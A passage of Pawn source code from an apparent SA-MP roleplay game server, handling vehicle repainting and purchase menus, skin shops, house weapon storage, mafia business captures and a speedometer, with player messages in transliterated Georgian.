	if(clickedid == ColorTD[8])
	{
	    PlayerTextDrawHide(playerid,ColorTDPl[playerid][6]);
	    PlayerTextDrawColor(playerid,ColorTDPl[playerid][6],RGBArray[SecondaryColor[playerid]]);
	    PlayerTextDrawShow(playerid,ColorTDPl[playerid][6]);
	    SecondaryColor[playerid]--;
	    if(SecondaryColor[playerid] < 0) SecondaryColor[playerid] = 255;
	    PlayerTextDrawHide(playerid,ColorTDPl[playerid][5]);
	    PlayerTextDrawColor(playerid,ColorTDPl[playerid][5],RGBArray[SecondaryColor[playerid]]);
	    PlayerTextDrawShow(playerid,ColorTDPl[playerid][5]);
	    new curcol = SecondaryColor[playerid]-1;
	    if(curcol < 0) curcol = 255;
	    PlayerTextDrawHide(playerid,ColorTDPl[playerid][4]);
	    PlayerTextDrawColor(playerid,ColorTDPl[playerid][4],RGBArray[curcol]);
	    PlayerTextDrawShow(playerid,ColorTDPl[playerid][4]);
	    if(SecondaryColor[playerid] == pData[playerid][pColor2])
		{
		    new str[32];
			RepaintValue[playerid] -= PAINT_VALUE;
			ChangedSecondaryColor[playerid] = false;
			format(str,32,"$%d",RepaintValue[playerid]);
			PlayerTextDrawSetString(playerid,ColorTDPl[playerid][0],str);
		}
	    else if(!ChangedSecondaryColor[playerid])
	    {
	        new str[32];
	        ChangedSecondaryColor[playerid] = true;
	        RepaintValue[playerid] += PAINT_VALUE;
	        format(str,32,"$%d",RepaintValue[playerid]);
			PlayerTextDrawSetString(playerid,ColorTDPl[playerid][0],str);
		}
		ChangeVehicleColor(GetPlayerVehicleID(playerid),PrimaryColor[playerid],SecondaryColor[playerid]);
	    return true;
	}
	if(clickedid == ColorTD[15])
	{
	    if(RepaintValue[playerid] == 0) return SendClientMessage(playerid,CGRAY,"Shen Ar Agirchevia Araferi.");
        if(GetPlayerMoneyEx(playerid) < RepaintValue[playerid]) return SendClientMessage(playerid,CGRAY,"Arasakmarisi Tanxa.");
        if(!pData[playerid][pCar] || !IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,CGRAY,"Sheidzleba Mxolod Sakutari Manqanis Shegebva");
		TransferMoney(playerid,-1,RepaintValue[playerid]);

        ChangeVehicleColor(GetPlayerVehicleID(playerid),PrimaryColor[playerid],SecondaryColor[playerid]);
		pData[playerid][pColor1] = PrimaryColor[playerid];
		pData[playerid][pColor2] = SecondaryColor[playerid];
		if(ChangedPrimaryColor[playerid]) ChangedPrimaryColor[playerid] = false;
		if(ChangedSecondaryColor[playerid]) ChangedSecondaryColor[playerid] = false;

		for(new i=5;i<8;i++)
		{
		    gBusiness[i][busiProduct] -= 20;
			gBusiness[i][busiBank] += 100;
			UpdateBusinessData(i,"product",gBusiness[i][busiProduct]);
			UpdateBusinessData(i,"bank",gBusiness[i][busiBank]);
		}

		new query[200];
		format(query,sizeof(query),"UPDATE `members` SET `color1` = '%d',`color2` = '%d' WHERE `nickname` = '%s'",PrimaryColor[playerid],SecondaryColor[playerid],Name2(playerid));
		mysql_empty(mysql, query);
		SendClientMessage(playerid,CGREEN,"Avtomobili Sheigeba Axal Frad");

		for(new i = 0; i < 20; i++) TextDrawHideForPlayer(playerid,ColorTD[i]);
  		for(new i = 0; i < 7; i++) PlayerTextDrawHide(playerid,ColorTDPl[playerid][i]);
  		CancelSelectTextDraw(playerid);
	}
    if(clickedid == VehSelect[2])
	{
	    new str[32];
	    VehSelectNum[playerid]--;
		if(VehSelectNum[playerid] == -1) VehSelectNum[playerid] = sizeof(VehiclesIndent)-1;
		DestroyVehicle(vehplayer[playerid]);
		vehplayer[playerid] = CreateVehicle(VehiclesIndent[VehSelectNum[playerid]][MI],-1660.2301,1213.8774,13.3913,223.3013,0,0,-1);
		SetVehicleVirtualWorld(vehplayer[playerid],playerid+1);
		PlayerTextDrawSetString(playerid,VehSelectPl[playerid][0],VehiclesIndent[VehSelectNum[playerid]][Name]);
		format(str,32,"$%d",VehiclesIndent[VehSelectNum[playerid]][Price]);
		PlayerTextDrawSetString(playerid,VehSelectPl[playerid][4],str);
		for(new i = 1; i < 4; i++) PlayerTextDrawHide(playerid,VehSelectPl[playerid][i]);
		PlayerTextDrawTextSize(playerid,VehSelectPl[playerid][1],75.0/100.0*VehiclesIndent[VehSelectNum[playerid]][TS]/3.0+485.0,5.0);
		PlayerTextDrawTextSize(playerid,VehSelectPl[playerid][2],75.0/100.0*VehiclesIndent[VehSelectNum[playerid]][AR]/3.0+485.0,5.0);
		PlayerTextDrawTextSize(playerid,VehSelectPl[playerid][3],75.0/100.0*VehiclesIndent[VehSelectNum[playerid]][HL]/3.0+485.0,5.0);
		for(new i = 1; i < 4; i++) PlayerTextDrawShow(playerid,VehSelectPl[playerid][i]);
		return true;
	}
	if(clickedid == VehSelect[3])
	{
	    new str[32];
	    VehSelectNum[playerid]++;
		if(VehSelectNum[playerid] == sizeof(VehiclesIndent)) VehSelectNum[playerid] = 0;
		DestroyVehicle(vehplayer[playerid]);
		vehplayer[playerid] = CreateVehicle(VehiclesIndent[VehSelectNum[playerid]][MI],-1660.2301,1213.8774,13.3913,223.3013,0,0,-1);
		SetVehicleVirtualWorld(vehplayer[playerid],playerid+1);
		PlayerTextDrawSetString(playerid,VehSelectPl[playerid][0],VehiclesIndent[VehSelectNum[playerid]][Name]);
		format(str,32,"$%d",VehiclesIndent[VehSelectNum[playerid]][Price]);
		PlayerTextDrawSetString(playerid,VehSelectPl[playerid][4],str);
		for(new i = 1; i < 4; i++) PlayerTextDrawHide(playerid,VehSelectPl[playerid][i]);
		PlayerTextDrawTextSize(playerid,VehSelectPl[playerid][1],75.0/100.0*VehiclesIndent[VehSelectNum[playerid]][TS]/3.0+485.0,5.0);
		PlayerTextDrawTextSize(playerid,VehSelectPl[playerid][2],75.0/100.0*VehiclesIndent[VehSelectNum[playerid]][AR]/3.0+485.0,5.0);
		PlayerTextDrawTextSize(playerid,VehSelectPl[playerid][3],75.0/100.0*VehiclesIndent[VehSelectNum[playerid]][HL]/3.0+485.0,5.0);
		for(new i = 1; i < 4; i++) PlayerTextDrawShow(playerid,VehSelectPl[playerid][i]);
		return true;
	}
	if(clickedid == VehSelect[11])
 	{
 	    if(!pData[playerid][pHouse]) return SendClientMessage(playerid,CGRAY,"Unda Gqondet Saxli Rom Iyidot Avtomobili");
		if(pData[playerid][pHouse])
		{
			new houseid = pData[playerid][pHouse] - 1;
			if(!GetString(Name2(playerid),gHouses[houseid][houseOwner])) return SendClientMessage(playerid,CGRAY,"Mxolod Saxlis Mflobelebs Sheudzliat Iyidon Avtomobili");
		}
		if(pData[playerid][pCar]) return SendClientMessage(playerid,CGRAY,"Tqven Unda Gayidot Manqana Rom Iyidot Axali");
		if(GetPlayerMoneyEx(playerid) < VehiclesIndent[VehSelectNum[playerid]][Price]) return SendClientMessage(playerid,CGRAY,"Shen Ar Gaq Sakmarisi Tanxa Rom Iyido Avtomobili");
		ShowPlayerDialog(playerid,dBuyCarC1,2,"Airchiet Nomris Feri 1","1.Tetri\n{505050}2.Shavi\n{"#cLIGHTBLUE"}3.Cisperi\n{"#cRED"}4.Witeli\n{"#cYELLOW"}5.Yviteli\n{"#cBLUE"}6.Lurji\n{"#cGRAY"}7.Nacrisperi\n{"#cPINK"}8.Vardisperi\n{f5f5dc}9.Beji\n{ff00ff}10.Iisferi\n{"#cWHITE"}Sxva...","OK","EXIT");
	}
 	if(clickedid == Dallee[0])
    {
        if(GetPVarInt(playerid,"SelectStoreGun") == 1)
		{
		    new id = pTemp[playerid][pStoreGun];
			if(id == 8) id = 0;
			else id++;
			new houseid = pData[playerid][pHouse]-1;
			new hintid = gHouses[houseid][houseHint];
			for(new i=id;i<9;i++)
			{
			    if(!gHouses[houseid][houseGun][i]) continue;
				if(gHouses[houseid][houseGun][i])
				{
					new Float:x, Float:y, Float:z, Float:x2, Float:y2, Float:z2;
					GetPlayerCameraPos(playerid,x,y,z);
					GetGunCameraOffset(gHintGun[hintid][i][0],gHintGun[hintid][i][1],gHintStore[hintid][5],x2,y2);
					z2 = gHintGun[hintid][i][2] + 0.4;
					InterpolateCameraPos(playerid,x,y,z,x2,y2,z2,700,CAMERA_MOVE);
					GetPlayerCameraFrontVector(playerid,x2,y2,z2);
					x += x2;
					y += y2;
					z += z2;
					InterpolateCameraLookAt(playerid,x,y,z,gHintGun[hintid][i][0],gHintGun[hintid][i][1],gHintGun[hintid][i][2],700,CAMERA_MOVE);
					pTemp[playerid][pStoreGun] = i;
					SetPVarInt(playerid,"SelectStoreGun",0);
					SetTimerEx("SelectStoreGun",1000,false,"i",playerid);
					new gunname[32];
					new mes2[128];
					GetWeaponName(GetStoreGunID(i),gunname,32);
					format(mes2,48,"~w~%s (~g~%d~w~)",gunname,gHouses[houseid][houseGun][i]);
					GameTextForPlayer(playerid,mes2,100000,3);
					break;
				}
			}
		}
    }
    if(clickedid == Dallee[1])
    {
        if(GetPVarInt(playerid,"SelectStoreGun") == 1)
        {
            new id = pTemp[playerid][pStoreGun];
			if(id == 0) id = 8;
			else id--;
			new houseid = pData[playerid][pHouse]-1;
			new hintid = gHouses[houseid][houseHint];
			for(new i=id;i>=0;i--)
			{
			    if(!gHouses[houseid][houseGun][i]) continue;
				if(gHouses[houseid][houseGun][i])
				{
					new Float:x, Float:y, Float:z, Float:x2, Float:y2, Float:z2;
					GetPlayerCameraPos(playerid,x,y,z);
					GetGunCameraOffset(gHintGun[hintid][i][0],gHintGun[hintid][i][1],gHintStore[hintid][5],x2,y2);
					z2 = gHintGun[hintid][i][2] + 0.4;
					InterpolateCameraPos(playerid,x,y,z,x2,y2,z2,700,CAMERA_MOVE);
					GetPlayerCameraFrontVector(playerid,x2,y2,z2);
					x += x2;
					y += y2;
					z += z2;
					InterpolateCameraLookAt(playerid,x,y,z,gHintGun[hintid][i][0],gHintGun[hintid][i][1],gHintGun[hintid][i][2],700,CAMERA_MOVE);
					pTemp[playerid][pStoreGun] = i;
					SetPVarInt(playerid,"SelectStoreGun",0);
					SetTimerEx("SelectStoreGun",1000,false,"i",playerid);
					new gunname[32];
					new mes2[128];
					GetWeaponName(GetStoreGunID(i),gunname,32);
					format(mes2,48,"~w~%s (~g~%d~w~)",gunname,gHouses[houseid][houseGun][i]);
					GameTextForPlayer(playerid,mes2,100000,3);
					break;
				}
			}
        }
    }
    if(clickedid == Dallee[2])
    {
        if(GetPVarInt(playerid,"SellCarSelect") == 1)
		{
			if(!pData[playerid][pHouse]) return SendClientMessage(playerid,CGRAY,"Unda Gqondet Saxli Rom Iyidot Avtomobili");
			if(pData[playerid][pHouse])
			{
				new houseid = pData[playerid][pHouse] - 1;
				if(!GetString(Name2(playerid),gHouses[houseid][houseOwner])) return SendClientMessage(playerid,CGRAY,"Mxolod Saxlis Mflobelebs Sheudzliat Iyidon Avtomobili");
			}
			if(pData[playerid][pCar]) return SendClientMessage(playerid,CGRAY,"Tqven Unda Gayidot Manqana Rom Iyidot Axali");
			new carid = GetPVarInt(playerid,"sellcarID");
			new model = GetVehicleModel(carid);
			new modelid = model - 400;
			if(GetPlayerMoneyEx(playerid) < gTransport[modelid][trPrice]) return SendClientMessage(playerid,CGRAY,"Shen Ar Gaq Sakmarisi Tanxa Rom Iyido Avtomobili");
			ShowPlayerDialog(playerid,dBuyCarC1,2,"Airchiet Nomris Feri 1","1.Tetri\n{505050}2.Shavi\n{"#cLIGHTBLUE"}3.Cisperi\n{"#cRED"}4.Witeli\n{"#cYELLOW"}5.Yviteli\n{"#cBLUE"}6.Lurji\n{"#cGRAY"}7.Nacrisperi\n{"#cPINK"}8.Vardisperi\n{f5f5dc}9.Beji\n{ff00ff}10.Iisperi\n{"#cWHITE"}Sxva...","OK","EXIT");
		}
  		if(GetPVarInt(playerid,"SelectStoreGun") == 1)
		{
			new gunname[32];
			new mes2[128];
			GetWeaponName(gHintGunID[pTemp[playerid][pStoreGun]],gunname,32);
			format(mes2,sizeof(mes2),"{"#cWHITE"}Miutitet Tyviebis Raodenoba{"#cGREEN"}%s{"#cWHITE"} Gsurt Aigot:");
			ShowPlayerDialog(playerid,dStoreGet,1,"Karada",mes2,"Ageba","ClOSE");
		}
    }
    if(clickedid == Dallee[3])
    {
        if(GetPVarInt(playerid,"SelectStoreGun") == 1)
        {
            new Float:x, Float:y, Float:z, Float:x1, Float:y1, Float:z1;
			x = GetPVarFloat(playerid,"oldcx");
			y = GetPVarFloat(playerid,"oldcy");
			z = GetPVarFloat(playerid,"oldcz");
			GetPlayerCameraPos(playerid,x1,y1,z1);
			InterpolateCameraPos(playerid,x1,y1,z1,x,y,z,700,CAMERA_MOVE);
			SetTimerEx("SetCameraBehindPlayerDelay",1000,false,"i",playerid);
			SetPVarInt(playerid,"SelectStoreGun",0);
			pTemp[playerid][pStoreGun] = 0;
			GameTextForPlayer(playerid," ",100,3);
			TogglePlayerControllable(playerid,1);
			for(new i = 0; i < 4; i++) TextDrawHideForPlayer(playerid,Dallee[i]);
            CancelSelectTextDraw(playerid);
        }
    }
    if(clickedid == gInterfaceElement[C_ELEMENT_WANTED_PHOTO3])
	{
	    if(GetPVarInt(playerid,"mafiajob") != 7) return true;
	    SetPVarInt(playerid,"clickedid",GetPVarInt(playerid,"clickedid") + 1);
	    GameTextForPlayer(playerid, "~r~Attack", 1000, 1);
		if(GetPVarInt(playerid,"clickedid") >= 8)
	    {
	        SetPVarInt(playerid,"clickedid",0);
	        SendClientMessage(playerid,CGREEN,"Mevale: Gacherdi! Ar Mcemo! Ai Sheni Fuli.");
	        SendClientMessage(playerid,CYELLOW,"Shen: Droze Fuli.");

	        TogglePlayerControllable(playerid,1);
			TextDrawHideForPlayer(playerid,gInterfaceElement[C_ELEMENT_BACKGROUND]);
			TextDrawHideForPlayer(playerid,gInterfaceElement[C_ELEMENT_WANTED_PHOTO3]);

			SendClientMessage(playerid,CGRAY,"Mevales Waartvit Tqveni Fuli. Wadit Bazaze Da Miiget Tqveni Jildo.");
			SetPlayerAttachedObject(playerid,0,1550,15,0,0.30,-0.30,0,0,-10);
			ClearAnimations(playerid);
			DisablePlayerCheckpoint(playerid);
			CancelSelectTextDraw(playerid);
	    }
	}
	if(clickedid == gSkinShopDraw[0]) {
		new
		    b_skins[114][2],
		    b_sel = GetPVarInt(playerid, "clothes_sel"),
		    b_skin,
		    b_price,
		    b_max = 0,
		    b_str[32]
		;
		for(new x, z; x < sizeof(gSkins); x ++) {
			b_skin = GetSkinID(pData[playerid][pSex], x);
			b_price = GetSkinPrice(x);
			if(!b_skin) continue;
			b_skins[z][0] = b_skin;
			b_skins[z][1] = b_price;
			z ++;
		}
		for(new x; x < sizeof(b_skins) - 1; x ++) {
		    if(!b_skins[x + 1][0]) {
				b_max = x;
				break;
			}
		    else continue;
		}
		if(b_sel == b_max) b_sel = 0;
		else b_sel ++;
		SetPlayerSkin(playerid, b_skins[b_sel][0]);
		format(b_str, 32, "~y~$%i", b_skins[b_sel][1]);
		PlayerTextDrawSetString(playerid, gSkinShopPriceDraw[playerid], b_str);
		SetPVarInt(playerid, "clothes_sel", b_sel);
	}
	else if(clickedid == gSkinShopDraw[1]) {
		new
		    b_skins2[114][2],
		    b_sel = GetPVarInt(playerid, "clothes_sel"),
		    b_skin,
		    b_price,
		    b_max = 0,
		    b_str[32]
		;
		for(new x, z; x < sizeof(gSkins); x ++) {
			b_skin = GetSkinID(pData[playerid][pSex], x);
			b_price = GetSkinPrice(x);
			if(!b_skin) continue;
			b_skins2[z][0] = b_skin;
			b_skins2[z][1] = b_price;
			z ++;
		}
		for(new x; x < sizeof(b_skins2) - 1; x ++) {
		    if(!b_skins2[x + 1][0]) {
				b_max = x;
				break;
			}
		    else continue;
		}
		if(b_sel - 1 < 0) b_sel = b_max;
		else b_sel --;
		SetPlayerSkin(playerid, b_skins2[b_sel][0]);
		format(b_str, 32, "~y~$%i", b_skins2[b_sel][1]);
		PlayerTextDrawSetString(playerid, gSkinShopPriceDraw[playerid], b_str);
		SetPVarInt(playerid, "clothes_sel", b_sel);
	}
	else if(clickedid == gSkinShopDraw[3]) {
		new
			b_skin = GetPlayerSkin(playerid),
			b_index = -15
		;
		for(new x; x < sizeof(gSkins); x ++) {
			if(gSkins[x][skinID] != b_skin) continue;
			b_index = x;
			break;
		}
		SetPVarInt(playerid, "clothes_select", b_index);
		SPFD(playerid,dBuySkin,0,"Tansacmis Yidva","Ki","Ara","{"#cWHITE"}Tqven Gindat Iyidot Tansacmeli {"#cRED"}$%i{"#cWHITE"}?",GetSkinPrice(b_index));
	}
	else if(clickedid == gSkinShopDraw[4] || (GetPVarInt(playerid, "clothes_td") && clickedid == Text:INVALID_TEXT_DRAW)) {
        if(GetPVarInt(playerid,"ChangingSkin") == 1) {
			HidePlayerClothesTD(playerid);
			SetPVarInt(playerid,"JustTP",1);
			SetPlayerPos(playerid, GetPVarFloat(playerid, "posx"), GetPVarFloat(playerid, "posy"), GetPVarFloat(playerid, "posz"));
			SetPlayerInterior(playerid, GetPVarInt(playerid, "interior"));
			SetPlayerVirtualWorld(playerid, GetPVarInt(playerid, "vw"));
			SetPlayerFacingAngle(playerid, GetPVarInt(playerid, "posa"));
			TogglePlayerControllable(playerid, 1);
			SetPlayerSkin(playerid, GetPVarInt(playerid, "curskin"));
			SetCameraBehindPlayer(playerid);
			DeletePVar(playerid, "posx");
			DeletePVar(playerid, "posy");
			DeletePVar(playerid, "posz");
			DeletePVar(playerid, "posa");
			DeletePVar(playerid, "interior");
			DeletePVar(playerid, "vw");
			DeletePVar(playerid, "clothes_sel");
			DeletePVar(playerid, "clothes_class");
			SetPVarInt(playerid,"ChangingSkin",0);
		}
	}
    if(clickedid == Statistic[SkinExit]) CloseInventory(playerid);
    if(clickedid == Statistic[SkinUpdate]) ShowPass(playerid,playerid);
    return false;
}

public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ)
{
	if(GetPVarInt(playerid,"selectpoint") > 0 && GetPVarInt(playerid,"selectpoint") < 3)
	{
		SetPVarInt(playerid,"selectpoint",2);
		SetPVarFloat(playerid,"selectpointX",fX);
		SetPVarFloat(playerid,"selectpointY",fY);
		SetPlayerMapIcon(playerid,iconTaxi,fX,fY,fZ,0,CYELLOW,1);
		SendClientMessage(playerid,CINFO,"Shen Daayene {"#cYELLOW"}Danishnulebis Adgili. {"#cINFO"}Rom Daadasturot, Daaweqit {"#cWHITE"}~k~~CONVERSATION_YES~");
	}
	if(GetPVarInt(playerid,"BizWar") == 1)
	{
	    new faction;
	    IsStrela = 1;
	    PokasGZ = GangZoneCreate(fX+70.0, fY+70.0, fX-70.0, fY-70.0);
	    for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
		{
  			i = cvector_get(players, idxf);
	 		if(IsAMafia(i)) GangZoneShowForPlayer(i, PokasGZ, CRED);
  		}
		SendFMes(MafiaNapad, CGREEN, "Tqvenma Mafiam Danishna Shexvedra. Shexvedris Adgilia Agnishnulia Rukaze Witeli Nishnulit.");
		SetPVarInt(playerid,"BizWar",0);
		faction = pData[playerid][pFraction];

		pMafias[playerid][hX] = fX+70.0;
 		pMafias[playerid][hY] = fY+70.0;
 		pMafias[playerid][hZ] = fZ;

		pMafias[MafiaNapad][hX] = fX+70.0;
 		pMafias[MafiaNapad][hY] = fY+70.0;
 		pMafias[MafiaNapad][hZ] = fZ;

		GangInfoD[faction][capture] = 1;
		GangInfoD[MafiaNapad][capture] = 1;
		GangInfoD[MafiaNapad][captureid] = faction;
		GangInfoD[faction][captureid] = faction;

		GangInfoD[faction][gangnumber] = 1;
		GangInfoD[MafiaNapad][gangnumber] = 0;

		gNapadMafia = faction;
		gSecury = MafiaNapad;

		for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
		{
  			i = cvector_get(players, idxf);
			if(IsAMafia(i)) CaptureUpdD(i);
		}

		MafiaNapad = 0;
	}
	return true;
}
stock CaptureUpdD(bandkiller)
{
	new SCORE1[128];
	for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
	{
		i = cvector_get(players, idxf);
		if(IsAMafia(i))
		{
			if(GangInfoD[bandkiller][gangnumber] == 1) XDrawI1 = GangInfoD[bandkiller][score];
			else XDrawI2 = GangInfoD[bandkiller][score];
			format(SCORE1, 100, "~y~Fight for business:~n~~g~%s ~r~%d  ~p~%s ~r~%d", GetMafiaName(gNapadMafia), XDrawI1, GetMafiaName(gSecury), XDrawI2);
			TextDrawSetString(TextdrawMCAPT,SCORE1);
			TextDrawShowForPlayer(i,TextdrawMCAPT);
		}
	}
}
stock CaptureEndD()
{
	for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
	{
		i = cvector_get(players, idxf);
		if(IsAMafia(i))
		{
			TextDrawHideForPlayer(i, TextdrawMCAPT);
			XDrawI1 = 0;
			XDrawI2 = 0;
			GangInfoD[gNapadMafia][score] = 0;
			GangInfoD[gSecury][score] = 0;
		}
	}
}
stock GzCheckD()
{
	for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
	{
		i = cvector_get(players, idxf);
		if(IsAMafia(i))
		{
		    if(GangInfoD[gNapadMafia][gangnumber] == 1 && GangInfoD[gNapadMafia][score] == 8)
			{
			    gBusiness[MafiaID][busiMafia] = gNapadMafia;
			    UpdateBusinessData(MafiaID+1,"mafia",gBusiness[MafiaID][busiMafia]);
                IsStrela = 0;
                UpdateBusinessText(MafiaID);
                GangZoneHideForAll(PokasGZ);
                GangZoneDestroy(PokasGZ);
                SendFMes(gSecury, CRED, "Tqven Ver Daipyarit Axali Biznesi.");
                SendFMes(gNapadMafia, CGREEN, "Tqven Daipyarit Axali Biznesi.");
                CaptureEndD();
				MafiaID = 0;
				gNapadMafia = 0;
				gSecury = 0;
			}
			else if(GangInfoD[gSecury][gangnumber] == 0 && GangInfoD[gSecury][score] == 8)
			{
                IsStrela = 0;
                GangZoneHideForAll(PokasGZ);
                GangZoneDestroy(PokasGZ);
                SendFMes(gNapadMafia, CRED, "Biznesi Wagartvat Mowinaagmdegem.");
                SendFMes(gSecury, CGREEN, "Tqven Sheinarchunet Biznesi.");
                CaptureEndD();
				MafiaID = 0;
				gNapadMafia = 0;
				gSecury = 0;
			}
		}
	}
}
public OnPlayerTakeDamage(playerid, issuerid, Float:amount, weaponid, bodypart)
{
    if(issuerid != INVALID_PLAYER_ID)
	{
		for(new i;i<sizeof(gAreas[arGreenZone]);i++)
		{
			if(IsPlayerInDynamicArea(issuerid,gAreas[arGreenZone][i]))
			{
			    ClearAnimations(playerid);
				TogglePlayerControllable(issuerid,0);
				SetTimerEx("Unfreez2",3000,false,"i",issuerid);
				ShowPlayerDialog(issuerid,dMes,0,"{"#cYELLOW"}Yuradgeba","{"#cWHITE"}Am Adgilas Ar Sheidzleba Chxubi","OK","");
			}
		}
	}
	if(weaponid == 23 && IsACop(issuerid))
	{
	    if(GetPVarInt(issuerid,"TazerGun") == 1)
		{
			new id = playerid;
			if(pData[id][pFraction] >= 8 && pData[id][pFraction] <= 11) return   SendClientMessage(issuerid, CGRAY, "Shen Arshegilia EleqtroShokis Gamoyeneba");
			if(IsPlayerInAnyVehicle(id)) return SendClientMessage(issuerid, CGRAY, "Motamashe Manqanashia!");
			if(GetPVarInt(id,"Tazer") > 0 || pTemp[id][pCuffee] == id) return SendClientMessage(issuerid,CGRAY,"Motamashe Eleqtroshokirebulia / Adevs Borkilebi");
			if(pData[issuerid][pSex] == 1) format(mes,sizeof(mes),"Daartyi EleqtroShoki %s",Name2(id));
			else format(mes,sizeof(mes),"Daartyi EleqtroShoki %s",Name2(id));
			MeAction(issuerid,mes);
			TogglePlayerControllable(id, 0);
			SetPlayerSpecialAction(id,SPECIAL_ACTION_HANDSUP);
			SetPVarInt(id,"Tazer",1);
		}
	}
	return true;
}

forward GangJOB(playerid);
public GangJOB(playerid)
{
    SendClientMessage(playerid,CGRAY,"Dzarcva Warmatebit Dasrulda. Wadi Sheni Bandis Bazaze, Rata Miigo Jildo.");
    TextDrawHideForPlayer(playerid,gInterfaceElement[C_ELEMENT_BACKGROUND]);
   	TogglePlayerControllable(playerid,1);
	ClearAnimations(playerid);
	DisablePlayerCheckpoint(playerid);
	return true;
}

forward MafiaJOB(playerid);
public MafiaJOB(playerid)
{
    SendClientMessage(playerid,CGRAY,"Dzarcva Warmatebit Dasrulda. Wadi Sheni Mafiis Bazaze, Rata Miigo Jildo");
    TextDrawHideForPlayer(playerid,gInterfaceElement[C_ELEMENT_BACKGROUND]);
	SetPlayerAttachedObject(playerid,0,1550,15,0,0.30,-0.30,0,0,-10);
   	TogglePlayerControllable(playerid,1);
	ClearAnimations(playerid);
	DisablePlayerCheckpoint(playerid);
	return true;
}

forward SeloLoad(playerid);
public SeloLoad(playerid)
{
    ApplyAnimation(playerid,"CARRY","crry_prtial",4.0,1,1,1,1,1,1);
	SetPlayerAttachedObject(playerid, 2, 2384, 5, 0.01, 0.1, 0.2, 100, 10, 85);
	SetPlayerCheckpoint(playerid,-22.2324,-186.5984,928.7820,3.0);
	SetPVarInt(playerid,"loadid",20);
	return true;
}

public AbleToSelectCar(playerid) SetPVarInt(playerid,"SellCarSelect",1);
public GunReady(playerid)
{
    if(!IsPlayerInDynamicArea(playerid,gAreas[arZavodLoad1]) && !IsPlayerInDynamicArea(playerid,gAreas[arZavodLoad2]) && !IsPlayerInDynamicArea(playerid,gAreas[arZavodLoad3]))
    {
		SendClientMessage(playerid,CGRAY,"Tqven Dakarget yvela Detali Gzashi.");
		SetPVarInt(playerid,"gunamount",0);
		SetPVarInt(playerid,"carrygun",0);
		RemovePlayerAttachedObject(playerid,0);
		RemovePlayerAttachedObject(playerid,1);
		ClearAnimations(playerid);
		SetPVarInt(playerid,"kida",2);
		SetPlayerCheckpoint(playerid,2154.7952,-1972.4408,13.6738,1.0);
		return true;
	}
	RemovePlayerAttachedObject(playerid,0);
	RemovePlayerAttachedObject(playerid,1);
	SetPVarInt(playerid,"gunamount",2);
	ClearAnimations(playerid);
	ApplyAnimation(playerid,"CARRY","crry_prtial",4.0,1,1,1,1,1,1);
	SetPlayerAttachedObject(playerid,0,1136,5,0.0,0.10,-0.2, -80.0,0.0,0.0);
	SendClientMessage(playerid,CWHITE,"Tqven Daamzadet Rkinigzis Relsi. Midit Witel Rgolshi");
	SetPlayerCheckpoint(playerid,2134.0593,-1978.8242,13.5469,4.0);
	return true;
}
public GunReady2(playerid)
{
	RemovePlayerAttachedObject(playerid,0);
	RemovePlayerAttachedObject(playerid,1);
	SetPVarInt(playerid,"gunamount",2);
	ClearAnimations(playerid);
	ApplyAnimation(playerid,"CARRY","crry_prtial",4.0,1,1,1,1,1,1);
	SetPlayerAttachedObject(playerid,0,2358,6,0.0,0.10,-0.2, -110.0,0.0,78.0);
	SetPlayerCheckpoint(playerid,gWoodCPs[7][0],gWoodCPs[7][1],gWoodCPs[7][2],5.0);
	return true;
}
stock GzChecker()
{
    if(captures > 0)
	{
	    new string[128], i = CaptFight;
		if(ZoneOnBattle[i] == 1)
		{
			for(new idxf=0, x=0; idxf<cvector_size(players); idxf++)
			{
  				x = cvector_get(players, idxf);
				if(pData[x][pFraction] == GZInfo[i][gNapad] || pData[x][pFraction] == GZInfo[i][gFrakVlad])
				{
        			if(CaptureOn[x] == 0)
					{
					    GangZoneFlashForAll(GZInfo[i][gID],GetGZColorF(pData[x][pFraction]));
						PlayerTextDrawShow(x, CaptureTime[x]);
      					CaptureOn[x] = 1;
					}
					if(GZSafeTime[i] > 0) format(string,sizeof(string),"~p~%s: ~g~%d/16~n~~p~%s: ~g~%d/16",GetGangName(GZInfo[i][gNapad]),CountOnZone[GZInfo[i][gNapad]],GetGangName(GZInfo[i][gFrakVlad]),CountOnZone[GZInfo[i][gFrakVlad]]);
					PlayerTextDrawSetString(x,CaptureTime[x],string);
				}
			}
		}
	}
}
stock SpeedVehicle(playerid)
{
    new Float:ST[4];
	if(IsPlayerInAnyVehicle(playerid)) GetVehicleVelocity(GetPlayerVehicleID(playerid),ST[0],ST[1],ST[2]);
	else GetPlayerVelocity(playerid,ST[0],ST[1],ST[2]);
    ST[3] = floatsqroot(floatpower(floatabs(ST[0]), 2.0) + floatpower(floatabs(ST[1]), 2.0) + floatpower(floatabs(ST[2]), 2.0)) * 190.0;
    return floatround(ST[3]);
}
stock UpdateCarInfo(playerid,const vehicleid)
{
    if(gVehicles[vehicleid-1][vFuel] <= 0.0)
	{
		gVehicles[vehicleid-1][vFuel] = 0.0;
  		RemovePlayerFromVehicle(playerid);
		SendClientMessage(playerid,CGRAY,"Matori Gaitisha. (Benzini Damtavrda)");
	}
 	if(SpeedVehicle(playerid) / 2 > 5) gVehicles[vehicleid-1][vFuel] -= 0.03;
 	if(gVehicles[vehicleid-1][vProbability2] == 1 && gVehicles[vehicleid-1][vProbability] == 0 && SpeedVehicle(playerid) / 2 >= 80)
 	{
 	    new Float:X, Float:Y, Float:Z;
 	    GetVehicleVelocity(vehicleid,X,Y,Z);
 	    SetVehicleVelocity(vehicleid,X*0.70,Y*0.70,Z);
 	}
 	new mes3[30], mes4[30];
 	switch(SpeedVehicle(playerid)/2)
 	{
 	    case 0..9: mes3 = "~b~IIIIIIIIIIIIIII";
 	    case 10..19: mes3 = "~y~I~b~IIIIIIIIIIIIII";
 	    case 20..29: mes3 = "~y~II~b~IIIIIIIIIIIII";
 	    case 30..39: mes3 = "~y~III~b~IIIIIIIIIIII";
 	    case 40..44: mes3 = "~y~IIII~b~IIIIIIIIIII";
 	    case 45..49: mes3 = "~y~IIIII~b~IIIIIIIIII";
 	    case 50..54: mes3 = "~y~IIIIII~b~IIIIIIIII";
 	    case 55..59: mes3 = "~y~IIIIIII~b~IIIIIIII";
 	    case 60..64: mes3 = "~y~IIIIIIII~b~IIIIIII";
 	    case 65..69: mes3 = "~y~IIIIIIIII~b~IIIIII";
